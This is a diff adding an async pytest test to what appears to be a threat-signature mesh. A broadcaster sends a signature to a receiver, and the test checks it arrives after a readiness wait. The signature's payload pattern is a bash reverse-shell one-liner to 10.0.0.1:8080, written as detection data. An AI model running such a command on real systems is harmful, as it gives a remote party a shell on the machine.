@@ -287,3 +287,37 @@ async def test_mesh_receiver_receive_one_queue_without_socket_race(temp_db):
     await receiver.stop()
     await repo.close()
 
+
+@pytest.mark.asyncio
+async def test_mesh_receiver_wait_until_ready_and_immediate_broadcast(temp_db):
+    """Verify receiver.wait_until_ready() establishes subscription so immediate broadcast is never dropped."""
+    repo = SQLiteThreatRepository(db_path=temp_db)
+    await repo.initialize()
+
+    endpoint = "tcp://127.0.0.1:5597"
+    broadcaster = MeshBroadcaster(endpoint=endpoint, bind=True, warmup_delay_s=0.0)
+    receiver = MeshReceiver(endpoint=endpoint, repository=repo, connect=True, warmup_delay_s=0.0)
+
+    await broadcaster.start()
+    await receiver.start()
+
+    # Use wait_until_ready helper
+    await receiver.wait_until_ready(timeout=0.08)
+
+    sig_id = "sig_immediate_after_ready"
+    broadcast_ok = await broadcaster.broadcast({
+        "signature_id": sig_id,
+        "payload_pattern": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+        "threat_level": "CRITICAL",
+    })
+    assert broadcast_ok is True
+
+    received = await receiver.receive_one(timeout=1.0)
+    assert received is not None
+    assert received.get("signature_id") == sig_id
+
+    await broadcaster.stop()
+    await receiver.stop()
+    await repo.close()
+
+
